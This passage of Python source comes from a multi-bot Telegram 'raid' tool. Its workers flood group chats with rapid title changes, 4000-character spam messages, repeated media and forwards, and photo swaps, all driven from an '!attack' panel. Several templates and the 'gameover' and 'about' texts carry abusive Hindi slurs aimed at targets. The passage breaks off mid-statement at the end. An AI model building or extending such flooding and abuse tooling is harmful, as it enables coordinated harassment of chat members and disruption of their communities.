Lord list groups if command starts with !g or !lord."""    if is_lord_cmd:        return list(lord_groups) if lord_groups else [message.chat.id]    return [message.chat.id]def get_active_groups_info():    active_chats = set()    for task_dict in [group_tasks, keng_tasks, spmnc_tasks, spm_loop_tasks, rspm_tasks, pfp_tasks, sticker_spm_tasks, gif_spm_tasks, media_spm_tasks, voice_spm_tasks, seq_nc_tasks, forwardspm_tasks, RAHULnc_tasks, RAHULspam_tasks]:        for key, val in task_dict.items():            if val: active_chats.add(key)    for key in swipe_mode:        active_chats.add(key)    return list(active_chats)async def generate_tts(text, lang="en"):    encoded_text = urllib.parse.quote(text.strip())    url = f"https://translate.google.com/translate_tts?ie=UTF-8&q={encoded_text}&tl={lang}&client=tw-ob"    headers = {"User-Agent": "Mozilla/5.0"}    try:        async with aiohttp.ClientSession() as session:            async with session.get(url, headers=headers) as response:                if response.status == 200:                    return await response.read()    except Exception:        pass    return Nonedef create_sticker_image(text, bg_color="black", font_type="default"):    if not HAS_PIL:        return None    import io        colors = {        "red": "#FF3B30", "blue": "#007AFF", "green": "#34C759",        "yellow": "#FFCC00", "black": "#1C1C1E", "white": "#F2F2F7", "purple": "#AF52DE"    }    bg_hex = colors.get(bg_color, "#1C1C1E")        img = Image.new("RGBA", (512, 512), (0, 0, 0, 0))    draw = ImageDraw.Draw(img)        bubble_bbox = [20, 100, 492, 412]    draw.rounded_rectangle(bubble_bbox, radius=40, fill=bg_hex)        font_obj = None    font_size = 65 if font_type == "bold" else 55    font_paths = [        "arial.ttf", "calibri.ttf", "tahoma.ttf", "seguiemj.ttf",         "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf" if font_type == "bold" else "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",        "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf" if font_type == "bold" else "/usr/share/fonts/truetype/liberation/LiberationSans-Regular.ttf",        "/System/Library/Fonts/Helvetica.ttc", "/Library/Fonts/Arial.ttf"    ]    for p in font_paths:        try:            font_obj = ImageFont.truetype(p, font_size)            break        except IOError:            continue                if font_obj is None:        font_obj = ImageFont.load_default()            text_color = "black" if bg_color in ["white", "yellow"] else "white"        wrapped_text = "\n".join(textwrap.wrap(text, width=15))        if HAS_PILMOJI:        with Pilmoji(img) as pilmoji:            pilmoji.text((256, 256), wrapped_text, fill=text_color, font=font_obj, anchor="mm", align="center")    else:        draw.text((256, 256), wrapped_text, fill=text_color, font=font_obj, anchor="mm", align="center")        bio = io.BytesIO()    img.save(bio, "WEBP")    bio.seek(0)    return bio.getvalue()async def seq_nc_worker(chat_id: int, base_text: str, active_bots: list, task_id: str):    bot_idx = 0    num_bots = len(active_bots)    while seq_nc_tasks.get(chat_id) == task_id:        try:            current_bot = active_bots[bot_idx]            bot_idx = (bot_idx + 1) % num_bots                        emoji_char = random.choice(SEQ_EMOJIS)            base_len = len(list(base_text))            emoji_len = len(list(emoji_char))                        max_repeats = max(1, (125 - base_len - 1) // max(1, emoji_len))            frame_to_set = base_text + " " + (emoji_char * max_repeats)                        await current_bot.set_chat_title(chat_id, frame_to_set[:125])            await asyncio.sleep(0.02)        except TelegramRetryAfter:            bot_idx = (bot_idx + 1) % num_bots            await asyncio.sleep(0.01)        except Exception:            await asyncio.sleep(0.1)async def nc_loop_worker(bot: Bot, chat_id: int, name: str, task_id: str):    while group_tasks.get(chat_id, {}).get(bot.id) == task_id:        try:            delay = nc_delays.get(chat_id, 150) / 1000.0            base_text = f"{name} {random.choice(RAID_TEXTS)}"            emoji_block = random.choice(emo_EMOJIS)                        base_len = len(list(base_text))            emoji_len = len(list(emoji_block))                        if base_len < 120:                max_repeats = (125 - base_len - 2) // emoji_len                frame_to_set = base_text + "  " + (emoji_block * max_repeats)            else:                frame_to_set = base_text                            await bot.set_chat_title(chat_id, frame_to_set[:125])            await asyncio.sleep(delay)        except TelegramRetryAfter as e:            await asyncio.sleep(e.retry_after + 0.1)        except Exception:            await asyncio.sleep(1)async def emo_loop_worker(bot: Bot, chat_id: int, base_text: str, task_id: str):    while group_tasks.get(chat_id, {}).get(bot.id) == task_id:        try:            delay = nc_delays.get(chat_id, 150) / 1000.0            emoji_block = random.choice(emo_EMOJIS) + random.choice(emo_EMOJIS)            base_len = len(list(base_text))            emoji_len = len(list(emoji_block))            max_repeats = max(1, (125 - base_len) // emoji_len)            dynamic_gap = " " * random.randint(1, 3)                        frame_to_set = base_text + dynamic_gap + (emoji_block * max_repeats)            await bot.set_chat_title(chat_id, frame_to_set[:125])            await asyncio.sleep(delay)        except TelegramRetryAfter as e:            await asyncio.sleep(e.retry_after + 0.1)        except Exception:            await asyncio.sleep(1)async def keng_loop_worker(bot: Bot, chat_id: int, name: str, task_id: str):    while keng_tasks.get(chat_id, {}).get(bot.id) == task_id:        try:            delay = nc_delays.get(chat_id, 150) / 1000.0            template = random.choice(KENG_TEMPLATES)            base_text = template["text"].replace("NAME", name)            emoji_block = template["emoji"]            base_len = len(list(base_text))            emoji_len = len(list(emoji_block))            max_repeats = max(1, (125 - base_len) // emoji_len)            dynamic_gap = " " * random.randint(1, 3)            frame_to_set = base_text + dynamic_gap + (emoji_block * max_repeats)            await bot.set_chat_title(chat_id, frame_to_set)            await asyncio.sleep(delay)        except TelegramRetryAfter as e:            await asyncio.sleep(e.retry_after + 0.1)        except Exception:            await asyncio.sleep(1)async def RAHULnc_loop_worker(bot: Bot, chat_id: int, name: str, task_id: str):    templates = ["ƘƳƲ ƦЄ NAME ƘƲƬƬЄ [ ƖƟƧƬ ] ƁƛƛƤ ƧЄ ƁƛƊƬƛⱮЄЄƵƖ? ","NAME ƲƬH ƩMƘƇ ","NAME ƝƇ ƝƇ ƘƦЄƓƛ ƦƝƊƖƘ","NAME <div>ƠƦ ⱮƛƖ ƘЄ ƇHƠƊƠ","NAME ƝƊ ƲƝƘЄ ӇƠⱮƖЄƧ ƘƖ Ɱƛ ƦƝƊƖ","NAME ƲƬH ƦƝƊƖƘ ƠҲƳƓЄƝ ԼЄ","ƇHƛԼ ƇHƛԼ NAME ƵƠƦ ԼƛƓƛ ⱮƇ","NAME ⱮƇ","NAME ƁƇ","NAME ƬƛƬƬЄ","NAME ƇHƲƊ"]    while RAHULnc_tasks.get(chat_id, {}).get(bot.id) == task_id:        try:            delay = nc_delays.get(chat_id, 500) / 1000.0            base = random.choice(templates).replace("NAME", name)                        c1 = "✘" if random.random() > 0.5 else "─"            c2 = "✘" if random.random() > 0.5 else "─"            c3 = "✘" if random.random() > 0.5 else "─"            c4 = "✘" if random.random() > 0.5 else "─"            c5 = "✘" if random.random() > 0.5 else "─"                        pattern = f"─────── {c1} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ────────{c2}─────{c3}───────❗────── ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{c4} {c5}"                        frame = (base + pattern)[:125]                        await bot.set_chat_title(chat_id, frame)            await asyncio.sleep(delay)        except TelegramRetryAfter as e:            await asyncio.sleep(e.retry_after + 0.1)        except Exception:            await asyncio.sleep(1)async def spmnc_worker(bot: Bot, chat_id: int, name: str, task_id: str):    last_msg_time = 0    while spmnc_tasks.get(chat_id, {}).get(bot.id) == task_id:        try:            delay = nc_delays.get(chat_id, 100) / 1000.0            long_raw = random.choice(SPMNC_LONG).replace("NAME", name)            small_raw = random.choice(SPMNC_SMALL).replace("NAME", name)            random_emoji = random.choice(emo_EMOJIS)            title_text = f"{random_emoji} {small_raw} {random_emoji}"            try:                await bot.set_chat_title(chat_id, title_text)            except TelegramRetryAfter as e:                await asyncio.sleep(e.retry_after + 0.1)                continue            except Exception:                pass            await asyncio.sleep(delay)            if time.time() - last_msg_time > 7.0:                try:                    await bot.send_message(chat_id, long_raw)                    last_msg_time = time.time()                except Exception:                    pass        except Exception:            await asyncio.sleep(1)async def copy_spm_sender(bot: Bot, chat_id: int, from_chat_id: int, msg_id: int, tasks_dict, task_id: str):    """Spams by flawlessly copying any given message entirely server-side."""    while task_id in tasks_dict.get(chat_id, []):        try:            d = spm_delays.get(chat_id, 900) / 1000.0            await bot.copy_message(chat_id=chat_id, from_chat_id=from_chat_id, message_id=msg_id)            await asyncio.sleep(d)        except TelegramRetryAfter as e:            await asyncio.sleep(e.retry_after + 0.5)        except Exception:            await asyncio.sleep(1.5)async def spm_sender(bot: Bot, chat_id: int, msg_id: int, text: str, tasks_dict, task_id_obj_key, task_id: str):    while task_id in tasks_dict.get(task_id_obj_key, []):        try:            d = spm_delays.get(chat_id, 900) / 1000.0            kwargs = {}            if msg_id:                 kwargs["reply_to_message_id"] = msg_id                        if LinkPreviewOptions:                kwargs["link_preview_options"] = LinkPreviewOptions(is_disabled=True)            else:                kwargs["disable_web_page_preview"] = True                            await bot.send_message(chat_id, text, **kwargs)            await asyncio.sleep(d)        except TelegramRetryAfter as e:            await asyncio.sleep(e.retry_after + 0.5)        except Exception:            await asyncio.sleep(1.5)async def RAHULspam_sender(bot: Bot, chat_id: int, text: str, tasks_dict, task_id: str):    content_len = len(text) * 2    if content_len < 4000:        newlines_count = 4000 - content_len        msg = text + ("\n" * newlines_count) + text    else:        msg = text[:4000]            while task_id in tasks_dict.get(chat_id, []):        try:            d = spm_delays.get(chat_id, 900) / 1000.0            kwargs = {}            if LinkPreviewOptions:                kwargs["link_preview_options"] = LinkPreviewOptions(is_disabled=True)            else:                kwargs["disable_web_page_preview"] = True                            await bot.send_message(chat_id, msg, **kwargs)            await asyncio.sleep(d)        except TelegramRetryAfter as e:            await asyncio.sleep(e.retry_after + 0.5)        except Exception:            await asyncio.sleep(1.5)async def media_spm_sender(bot: Bot, chat_id: int, media_type: str, file_id: str, caption, caption_entities, tasks_dict, task_id: str):    while task_id in tasks_dict.get(chat_id, []):        try:            d = spm_delays.get(chat_id, 900) / 1000.0            kwargs = {}            if caption: kwargs['caption'] = caption            if caption_entities: kwargs['caption_entities'] = caption_entities                        if media_type == "photo": await bot.send_photo(chat_id, file_id, **kwargs)            elif media_type == "video": await bot.send_video(chat_id, file_id, **kwargs)            elif media_type == "document": await bot.send_document(chat_id, file_id, **kwargs)            elif media_type == "audio": await bot.send_audio(chat_id, file_id, **kwargs)            elif media_type == "animation": await bot.send_animation(chat_id, file_id, **kwargs)            elif media_type == "sticker": await bot.send_sticker(chat_id, file_id)            elif media_type == "voice": await bot.send_voice(chat_id, file_id, **kwargs)                        await asyncio.sleep(d)        except TelegramRetryAfter as e:            await asyncio.sleep(e.retry_after + 0.5)        except Exception:            await asyncio.sleep(1.5)async def rspm_sender(bot: Bot, chat_id: int, name: str, tasks_dict, task_id: str):    while task_id in tasks_dict.get(chat_id, []):        try:            d = rspm_delays.get(chat_id, 900) / 1000.0            base = f"{name} {random.choice(RAID_TEXTS)}"            emoji = random.choice(emo_EMOJIS)                        chunk = f"{base} {emoji}\n\n\n\n\n\n\n\n\n\n"            msg_text = ""            while len(msg_text) + len(chunk) < 4000:                msg_text += chunk                            kwargs = {}            if LinkPreviewOptions:                kwargs["link_preview_options"] = LinkPreviewOptions(is_disabled=True)            else:                kwargs["disable_web_page_preview"] = True                            await bot.send_message(chat_id, msg_text, **kwargs)            await asyncio.sleep(d)        except TelegramRetryAfter as e:            await asyncio.sleep(e.retry_after + 0.5)        except Exception:            await asyncio.sleep(1.5)async def forward_spm_sender(bot: Bot, chat_id: int, from_chat_id: int, msg_id: int, tasks_dict, task_id: str):    while task_id in tasks_dict.get(chat_id, []):        try:            d = spm_delays.get(chat_id, 900) / 1000.0            await bot.forward_message(chat_id=chat_id, from_chat_id=from_chat_id, message_id=msg_id)            await asyncio.sleep(d)        except TelegramRetryAfter as e:            await asyncio.sleep(e.retry_after + 0.5)        except Exception:            await asyncio.sleep(1.5)async def pfp_loop_worker(bot: Bot, chat_id: int, task_id: str):    while task_id in pfp_tasks.get(chat_id, []):        try:            d = pfp_delays.get(chat_id, 900) / 1000.0            folder = os.path.join(os.path.dirname(__file__), 'downloads', str(chat_id))            if not os.path.exists(folder):                await asyncio.sleep(5)                continue            files = [f for f in os.listdir(folder) if f.endswith('.jpg')]            if not files:                await asyncio.sleep(5)                continue            pic = random.choice(files)            pic_path = os.path.join(folder, pic)            await bot.set_chat_photo(chat_id, FSInputFile(pic_path))            await asyncio.sleep(d)        except TelegramRetryAfter as e:            await asyncio.sleep(e.retry_after + 0.1)        except Exception:            await asyncio.sleep(2)def get_selector_keyboard(task_id: str):    menu = active_menus.get(task_id)    if not menu: return None    sel = menu['selected']    keyboard = []    row = []        max_display = min(len(bot_usernames), 90)    for i in range(max_display):        uname = bot_usernames[i]        check = "✅" if i in sel else "❌"        row.append(InlineKeyboardButton(text=f"{check} {uname}", callback_data=f"tk_{task_id}_tgl_{i}"))        if len(row) == 2:            keyboard.append(row)            row = []                if row: keyboard.append(row)    keyboard.append([        InlineKeyboardButton(text=font("🔘 Select All"), callback_data=f"tk_{task_id}_all"),        InlineKeyboardButton(text=font("⚪️ None"), callback_data=f"tk_{task_id}_none")    ])    keyboard.append([InlineKeyboardButton(text=font("🚀 START LAUNCH"), callback_data=f"tk_{task_id}_start")])    return InlineKeyboardMarkup(inline_keyboard=keyboard)async def send_start_menu(message: types.Message, bot: Bot):    owner_name = font(user_names.get(OWNER_ID, 'Owner'))    owner_acc = f"[{owner_name}](tg://user?id={OWNER_ID})"        user_mention = f"[{message.from_user.first_name}](tg://user?id={message.from_user.id})" if message.from_user else "Admin"        text = font("Hello ") + user_mention + font("!\nI'm an advanced bot created by RAHUL handled by ") + owner_acc + font(".\nHow can I help you?")        buttons = [[InlineKeyboardButton(text=font("👤 Owner"), url=f"tg://user?id={OWNER_ID}")],[InlineKeyboardButton(text=font("ℹ️ About"), callback_data="start_about")],[            InlineKeyboardButton(text=font("📜 Commands"), callback_data="start_restricted"),            InlineKeyboardButton(text=font("⚙️ Settings"), callback_data="start_restricted")        ]    ]    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)    try:        if os.path.exists(START_PIC_PATH):            await message.answer_photo(FSInputFile(START_PIC_PATH), caption=text, reply_markup=keyboard, parse_mode=ParseMode.MARKDOWN)        else:            await message.answer(text, reply_markup=keyboard, parse_mode=ParseMode.MARKDOWN)    except Exception:        await message.answer(text, reply_markup=keyboard, parse_mode=ParseMode.MARKDOWN)@dp.my_chat_member()async def on_my_chat_member(update: ChatMemberUpdated):    """Automatically logs the bot into groups and channels dynamically."""    if update.new_chat_member.status in ['member', 'administrator', 'restricted']:        known_chats.add(update.chat.id)        save_db()@dp.channel_post(Command("startpfp", prefix="/!"))@dp.message(Command("startpfp", prefix="/!"))async def cmd_startpfp(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_owner(get_auth_id(message)): return        if not message.photo and not (message.reply_to_message and message.reply_to_message.photo):        return await safe_reply(message, font("⚠️ Please send this command as a caption to a photo or reply to a photo."))            photo = message.photo[-1] if message.photo else message.reply_to_message.photo[-1]    await bot.download(photo, destination=START_PIC_PATH)        await safe_reply(message, font("✅ Permanent Start picture updated globally for ALL bots!"))    await send_start_menu(message, bot)@dp.channel_post(Command("setmenupic", prefix="/!"))@dp.message(Command("setmenupic", prefix="/!"))async def cmd_setmenupic(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_owner(get_auth_id(message)): return        if not message.photo and not (message.reply_to_message and message.reply_to_message.photo):        return await safe_reply(message, font("⚠️ Please reply to a photo with `!setmenupic`"), parse_mode=ParseMode.MARKDOWN)            photo = message.photo[-1] if message.photo else message.reply_to_message.photo[-1]    await bot.download(photo, destination=START_PIC_PATH)        await safe_reply(message, font("✅ Global menu picture updated successfully for ALL bots!"))    await send_start_menu(message, bot)@dp.channel_post(Command("resetmenupic", prefix="/!"))@dp.message(Command("resetmenupic", prefix="/!"))async def cmd_resetmenupic(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_owner(get_auth_id(message)): return        if os.path.exists(START_PIC_PATH):        os.remove(START_PIC_PATH)        await safe_reply(message, font("🗑 Global menu picture reset successfully! Start menus are now text-only for all bots."))    else:        await safe_reply(message, font("⚠️ No custom menu picture is currently set."))@dp.channel_post(Command("start", prefix="/!"))@dp.message(Command("start", prefix="/!"))async def cmd_start(message: types.Message, bot: Bot):    await send_start_menu(message, bot)@dp.channel_post(Command("menu", prefix="-./X!"))@dp.message(Command("menu", prefix="-./X!"))async def cmd_menu(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    menu_text = f"""╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮        ❤️‍🔥 {font("RAHUL KENG V4")}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮        ⚔️ {font("ATTACK & GAMEOVER")}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯✘ `!attack <text>` / `!gattack <text>` ➜ {font("Interactive attack panel")}✘ `!gameover <text>` / `!ggameover <text>` ➜ {font("Send game-over report (Owner only)")}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮        🤍 {font("NAME CHANGE (NC)")}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯✘ `!snc <text>` / `!dsnc` (Use `!g` prefix for ALL Lord groups)✘ `!nc <name>` / `!dnc`✘ `!emo <text>` / `!demo`✘ `!kengnc <name>` / `!dkengnc`✘ `!RAHULnc <name>` / `!dRAHULnc`✘ `!spmnc <text>` / `!dspmnc`✘ `!delaync <ms>` ➜ {font("Default: 500ms")}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮        📸 {font("MEDIA & STICKER")}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯✘ `!makesticker <text>` ➜ {font("Sticker Studio")}✘ `!tts <text>` ➜ {font("Voice Studio")}✘ `!stickerspm` / `!dstickerspm`✘ `!gifspm` / `!dgifspm`✘ `!mediaspm` / `!dmediaspm`✘ `!voicespam` / `!dvoicespm`✘ `!pfp` / `!dpfp` / `!gpfp`✘ `!save` / `!del` / `!gsave` (reply)✘ `!delaypfp <ms>` / `!delallmedia`╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮        ❤️‍🩹 {font("SLIDE & SPAM")}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯✘ `!forwardspm` / `!dforwardspm`✘ `!targetslide <name>` / `!dtargetslide`✘ `!slidespam <text>` / `!dslidespam`✘ `!spm <text>` / `!dspm` (Prefix `!g` e.g., `!gspm` for Lord groups)✘ `!RAHULspam <text>` / `!dRAHULspam`✘ `!rspm <name>` / `!drspm`✘ `!dallspm` / `!gdall` ➜ {font("Kill All spams")}✘ `!delaygcspm` / `!delayrspm` <ms>╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮        🥱 {font("REPLY & REACT")}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯✘ `!replyRAHUL` / `!dreplyRAHUL`✘ `!react <emoji>` / `!dreact`✘ `!swipe <name>` / `!dswipe`╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮        🤫 {font("MUTE & ADMIN")}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯✘ `!mute` / `!unmute` (reply/tag)✘ `!mutelist` / `!listsudo`✘ `!promoteall` / `!promoteallbots`✘ `!gpromote` / `!gdemote` ➜ {font("Promote/demote across Lord groups")}✘ `!addgroup` / `!delgroup` / `!listgroup`✘ `!addsudo` / `!delsudo`╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮        ⚙️ {font("SYSTEM CONTROL")}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮✘ `!setmenupic` / `!resetmenupic` ➜ {font("Manage global start menu picture")}✘ `!startpfp` / `!activebots` / `!missingbots`✘ `!broadcast` / `!getlink` /  `!getallactivelinks`✘ `!status` / `!uptime` / `!ping` / `!on`✘ `!o` ➜ {font("Optimize & Clear Cache")}✘ `!leave` ➜ {font("All Bots Leave")}✘ `!dall` ➜ {font("Stop All Tasks")}"""    await safe_reply(message, menu_text, parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("makesticker", prefix="-./X!"))@dp.message(Command("makesticker", prefix="-./X!"))async def cmd_makesticker(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return        exact_text = get_exact_text(message)    if not exact_text:        return await safe_reply(message, font("⚠️ Please provide text to make a sticker! Example: `!makesticker Hello`"), parse_mode=ParseMode.MARKDOWN)            if not HAS_PIL:        return await safe_reply(message, font("⚠️ Pillow library is not installed on your server! The Sticker Studio requires it. Install via `pip install Pillow`."))            task_id = str(uuid.uuid4())[:8]    active_menus[task_id] = {"cmd": "makesticker", "text": exact_text, "color": "black", "font": "default"}        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔴 Red", callback_data=f"stk_{task_id}_c_red"),         InlineKeyboardButton(text="🔵 Blue", callback_data=f"stk_{task_id}_c_blue"),         InlineKeyboardButton(text="🟢 Green", callback_data=f"stk_{task_id}_c_green")],[InlineKeyboardButton(text="🟡 Yellow", callback_data=f"stk_{task_id}_c_yellow"),         InlineKeyboardButton(text="⚫ Black", callback_data=f"stk_{task_id}_c_black"),         InlineKeyboardButton(text="⚪ White", callback_data=f"stk_{task_id}_c_white")],[InlineKeyboardButton(text="🖋 Standard Font", callback_data=f"stk_{task_id}_f_default"),         InlineKeyboardButton(text="🔠 Bold Font", callback_data=f"stk_{task_id}_f_bold")],[InlineKeyboardButton(text="🚀 GENERATE STICKER", callback_data=f"stk_{task_id}_gen")]    ])    await message.reply(font("🎨 **STICKER STUDIO**\nChoose background and font below:"), reply_markup=kb, parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("tts", prefix="-./X!"))@dp.message(Command("tts", prefix="-./X!"))async def cmd_tts(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return        exact_text = get_exact_text(message)    if not exact_text:        return await safe_reply(message, font("⚠️ Please provide text to speak! Example: `!tts Hello there`"), parse_mode=ParseMode.MARKDOWN)            task_id = str(uuid.uuid4())[:8]    active_menus[task_id] = {"cmd": "tts", "text": exact_text}        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🇬🇧 English", callback_data=f"tts_{task_id}_en"),         InlineKeyboardButton(text="🇮🇳 Hindi", callback_data=f"tts_{task_id}_hi"),         InlineKeyboardButton(text="🇸🇦 Arabic", callback_data=f"tts_{task_id}_ar")],[InlineKeyboardButton(text="🇷🇺 Russian", callback_data=f"tts_{task_id}_ru"),         InlineKeyboardButton(text="🇪🇸 Spanish", callback_data=f"tts_{task_id}_es"),         InlineKeyboardButton(text="🇫🇷 French", callback_data=f"tts_{task_id}_fr")],[InlineKeyboardButton(text="🇯🇵 Japanese", callback_data=f"tts_{task_id}_ja"),         InlineKeyboardButton(text="🇩🇪 German", callback_data=f"tts_{task_id}_de"),         InlineKeyboardButton(text="🇨🇳 Chinese", callback_data=f"tts_{task_id}_zh-CN")]    ])    await message.reply(font("🗣 **VOICE STUDIO**\nSelect language for precise slang/speech:"), reply_markup=kb, parse_mode=ParseMode.MARKDOWN)@dp.callback_query(F.data.startswith("start_"))async def start_callback_handler(query: types.CallbackQuery):    if query.data == "start_about":        owner_name = font(user_names.get(OWNER_ID, 'Owner'))        owner_acc = f"[{owner_name}](tg://user?id={OWNER_ID})"                text_part1 = font("I am a bot created by ")        text_part2 = font("❗. ")        text_part3 = font(" 👈iske kehne pe me teri ma v chod skta hu 😹💘.")        about_text = f"{text_part1}{owner_acc}{text_part2}{owner_acc}{text_part3}"                await query.message.answer(about_text, parse_mode=ParseMode.MARKDOWN)        await query.answer()            elif query.data == "start_restricted":        if query.from_user.id in SUDO_USERS:            await query.answer(font("✅ Access Granted. Use !help to see commands."), show_alert=True)        else:            await query.answer(font("⚠️ Ask owner to give you access ❤️"), show_alert=True)@dp.channel_post(Command("activebots", prefix="-./X!"))@dp.message(Command("activebots", prefix="-./X!"))async def cmd_activebots(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    text = font("❓ Active Bots:\n\n") + "\n".join(f"• @{u}" for u in bot_usernames) + font(f"\n\n✅ Total Bots: {len(bots)}")    await safe_reply(message, text, parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("missingbots", prefix="-./X!"))@dp.message(Command("missingbots", prefix="-./X!"))async def cmd_missingbots(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    missing = []    for i, b in enumerate(bots):        try:            member = await b.get_chat_member(message.chat.id, b.id)            if member.status in ['left', 'kicked', 'banned']: missing.append(bot_usernames[i])        except Exception:            missing.append(bot_usernames[i])    if not missing:        return await safe_reply(message, font("✅ All bots are already in this group/channel!"))    await safe_reply(message, font("🕵️‍♂️ **Missing Bots:**\n\n") + "\n".join(f"• @{u}" for u in missing), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("leave", prefix="-./X!"))@dp.message(Command("leave", prefix="-./X!"))async def cmd_leave(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    await safe_reply(message, font("👋 All bots are leaving this chat!"))    for b in bots:        try:            await b.leave_chat(message.chat.id)        except Exception: pass@dp.channel_post(Command("ping", prefix="-./X!"))@dp.message(Command("ping", prefix="-./X!"))async def cmd_ping(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    await safe_reply(message, font(f"🏓 Pong! ✅ {random.randint(30, 90)} ms"))@dp.channel_post(Command("myid", prefix="-./X!"))@dp.message(Command("myid", prefix="-./X!"))async def cmd_myid(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    auth_id = get_auth_id(message)    await safe_reply(message, font(f"🆔 Extracted Authorization ID: `{auth_id}`"), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("o", prefix="-./X!"))@dp.message(Command("o", prefix="-./X!"))async def cmd_optimize(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    save_db()    await safe_reply(message, font("✨ System optimized and Database saved."))# ==================== GAMEOVER COMMAND (@only_owner) ====================@dp.channel_post(Command("gameover", "ggameover", prefix="-./X!"))@dp.message(Command("gameover", "ggameover", prefix="-./X!"))async def cmd_gameover(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_owner(get_auth_id(message)):        return await safe_reply(message, font("❌ Only OWNER can use this command."))    is_lord = command.command.startswith("g")    target_chats = get_target_chats(message, is_lord)    ist = timezone(timedelta(hours=5, minutes=30))    now_ist = datetime.now(ist)    current_time = now_ist.strftime("%I:%M:%S %p")    current_date = now_ist.strftime("%d %B %Y")    user = message.from_user    name = (        f"@{user.username}"        if user and user.username        else (user.first_name if user else "UNKNOWN USER")    )    chat = message.chat    group_name = chat.title if chat and chat.title else "𝙐𝙉𝙆𝙉𝙊𝙒𝙉 𝙂𝙍𝙊𝙐𝙋"        custom_text = get_exact_text(message)    extra_msg = f"\n💬 ᴍᴇssᴀɢᴇ - {custom_text}\n" if custom_text else ""    text = (        f"═════════════════════════\n"        f"Ꮐᴀᴍᴇ ꪮᴠᴇʀ Ͳɪᴍᴇ - {current_time}\n"        f"Ꭰᴀᴛᴇ - {current_date} (IST)\n\n"        f"Ꭺʙʙ Ᏼᴀᴀᴘ Ꮶᴇ Ꭺɢɢᴇ\n"        f"Ꮋᴀᴡᴀʙᴀᴢᴢɪ Ꮶᴀʀɴᴇ Ꮇᴛᴛ Ꭺɴᴀᴀ\n\n"        f"{extra_msg}"        f"Ꮐʀᴏᴜᴘ - {group_name}\n\n"        f"Ͳᴇʀɪ Ꮇᴀᴀ Ꮯʜᴜᴅ Ꮶᴇ Ꭰꜰɴ Ᏼʏ - {name}\n"        f"═════════════════════════"    )    for c_id in target_chats:        try:            await bot.send_message(chat_id=c_id, text=text)        except Exception as e:            print(f"{RED}[GAME OVER] Error sending to {c_id}: {e}{RESET}")# ==================== ATTACK COMMAND & PANEL ====================@dp.channel_post(Command("attack", "gattack", prefix="-./X!"))@dp.message(Command("attack", "gattack", prefix="-./X!"))async def cmd_attack(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return        exact_text = get_exact_text(message)    if not exact_text:        return await safe_reply(message, font("⚠️ Please provide text for attack! Example: `!attack Hello`"), parse_mode=ParseMode.MARKDOWN)            is_lord = command.command.startswith("g")    task_id = str(uuid.uuid4())[:8]    active_menus[task_id] = {        "cmd": "attack_menu",         "text": exact_text,         "chat_id": message.chat.id,        "is_lord": is_lord    }        kb = InlineKeyboardMarkup(inline_keyboard=[        [InlineKeyboardButton(text="🤍 SNC Attack", callback_data=f"atk_{task_id}_snc"),         InlineKeyboardButton(text="🤍 NC Attack", callback_data=f"atk_{task_id}_nc")],        [InlineKeyboardButton(text="🤍 Emo NC", callback_data=f"atk_{task_id}_emo"),         InlineKeyboardButton(text="🤍 Keng NC", callback_data=f"atk_{task_id}_kengnc")],        [InlineKeyboardButton(text="🤍 RAHUL NC", callback_data=f"atk_{task_id}_RAHULnc"),         InlineKeyboardButton(text="🤍 Spm NC", callback_data=f"atk_{task_id}_spmnc")],        [InlineKeyboardButton(text="❤️‍🩹 Text SPM", callback_data=f"atk_{task_id}_spm"),         InlineKeyboardButton(text="❤️‍🩹 RAHUL SPM", 